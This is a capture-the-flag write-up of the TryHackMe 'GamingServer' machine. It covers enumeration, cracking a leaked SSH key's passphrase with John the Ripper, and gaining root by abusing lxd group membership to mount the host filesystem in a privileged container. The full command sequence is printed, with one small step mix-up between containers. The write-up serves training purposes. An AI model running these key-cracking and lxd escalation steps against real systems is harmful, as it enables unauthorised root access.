---
title: "GamingServer"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="gaming.jpeg" alt="gaming" style="width: 200px;" >}}

## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
                        [Status: 200, Size: 2762, Words: 241, Lines: 78]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 2762, Words: 241, Lines: 78]
robots.txt              [Status: 200, Size: 33, Words: 3, Lines: 4]
secret                  [Status: 301, Size: 315, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10]

```

Heh another ctf in the gaming theme...looks like a RPG
`uploads` got us files

`dict.lst` is obviously a dictionary for cracking

`meme.jpg` is...well a meme

`manifesto.txt` is a mad long text...and I read it...and damn it's full of...
things people may relate to
well...Its a manifesto

And in the `/secret` dir we get an rsa key
First I want to get steganography out of the way...and yes there was nothing there
Do you people remember how we always insist on checking source code?

```html
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```

Now we know `john`
ok we can try to ssh now...

```bash
└──╼ $chmod 600 secretKey

└──╼ $ssh john@10.10.89.54 -i secretKey
Enter passphrase for key 'secretKey':
```

Who didn't expect that? why would they give you a dictionary bro?

```bash
└──╼ $python2 /usr/share/john/ssh2john.py secretKey > secretkey.john

└──╼ $john secretkey.john -w=dict.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
1g 0:00:00:01 DONE (2021-12-02 13:26) 0.9345g/s 208.4p/s 208.4c/s 208.4C/s baseball
Session completed
```

Try again now and you got your user flag

```bash
john@exploitable:~$ cat user.txt
level_one_flag
```

## Privilege Escalation

upgrades people! upgrades!!

we cannot `sudo -l` so we need more enumeration

```bash
john@exploitable:~$ ls -al
total 60
drwxr-xr-x 8 john john  4096 Jul 27  2020 .
drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
drwx------ 2 john john  4096 Feb  5  2020 .cache
drwxr-x--- 3 john john  4096 Jul 27  2020 .config
drwx------ 3 john john  4096 Feb  5  2020 .gnupg
drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
drwx------ 2 john john  4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
-rw------- 1 root root 12070 Jul 27  2020 .viminfo
-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
```
yeah nothing here

```bash
john@exploitable:~$ find / -perm -u=s 2> /dev/null
/bin/mount
/bin/umount
/bin/su
/bin/fusermount
/bin/ping
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/newuidmap
```
hmmm....should we use linenum?

```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Add "always checking groups with `id`" to privesc enum process
Google `lxd privilege escalation` for more information

Seriously if it sounds easy you better check [here](https://0x44696f21.wordpress.com/2020/08/18/building-lxd-containers-on-kali/) and you might end up [here](https://linuxcontainers.org/distrobuilder/introduction/)

and [here](https://github.com/lxc/distrobuilder) XD

I had issues with `alpine-builder`
```bash
Downloading apk-tools-static-2.12.7-r3.apk
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
ERROR: checksum is missing for alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
Failed to download a valid static apk
```
So I had to use `distrobuilder`

Next we fire up a python server in `build` folder

Then grab the files on target machine

```bash
john@exploitable:/tmp$ wget http://10.8.226.203/lxd.tar.xz
--2021-12-02 18:21:12--  http://10.8.226.203/lxd.tar.xz
Connecting to 10.8.226.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 424 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz                                                 100%[========================================================================================================================================>]     424  --.-KB/s    in 0s

2021-12-02 18:21:14 (71.3 MB/s) - ‘lxd.tar.xz’ saved [424/424]

john@exploitable:/tmp$ wget http://10.8.226.203/rootfs.squashfs
--2021-12-02 18:21:34--  http://10.8.226.203/rootfs.squashfs
Connecting to 10.8.226.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1798144 (1.7M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs                                            100%[========================================================================================================================================>]   1.71M  49.1KB/s    in 32s

2021-12-02 18:22:06 (54.8 KB/s) - ‘rootfs.squashfs’ saved [1798144/1798144]
```
Import the image on target machine as mymnimal

```bash
john@exploitable:/tmp$ lxc image import --alias myminimal lxd.tar.xz rootfs.squashfs
Image imported with fingerprint: 3fd9f575e8312f2df6490e37cce8bdec46a378e73d4fd75fe18ff5c3b7479c70
```
launch it

```bash
john@exploitable:/tmp$ lxc launch myminimal mycontainer
Creating mycontainer
Starting mycontainer
```
check it

```bash
john@exploitable:/tmp$ lxc list mycontainer
+-------------+---------+------+-----------------------------------------------+------------+-----------+
|    NAME     |  STATE  | IPV4 |                     IPV6                      |    TYPE    | SNAPSHOTS |
+-------------+---------+------+-----------------------------------------------+------------+-----------+
| mycontainer | RUNNING |      | fd42:2998:1e63:3d6f:216:3eff:fe24:9e2d (eth0) | PERSISTENT | 0         |
+-------------+---------+------+-----------------------------------------------+------------+-----------+
```
create a new container with right privileges

```bash
john@exploitable:/tmp$ lxc init myminimal ignite -c security.privileged=true
Creating ignite
```
Mount the `/` folder in the container and start it

```bash
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite

john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
```
Get a root shell in that

```bash
john@exploitable:/tmp$ lxc exec mycontainer -- sh
~ # id
uid=0(root) gid=0(root)
```
Go grab the flags where they are

```bash
~ # cd /mnt/root
/mnt/root # ls
bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            swap.img        tmp             var             vmlinuz.old
boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             sys             usr             vmlinuz
/mnt/root # cd root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
lxd_final_boss_flag
```

Game Over...you win!
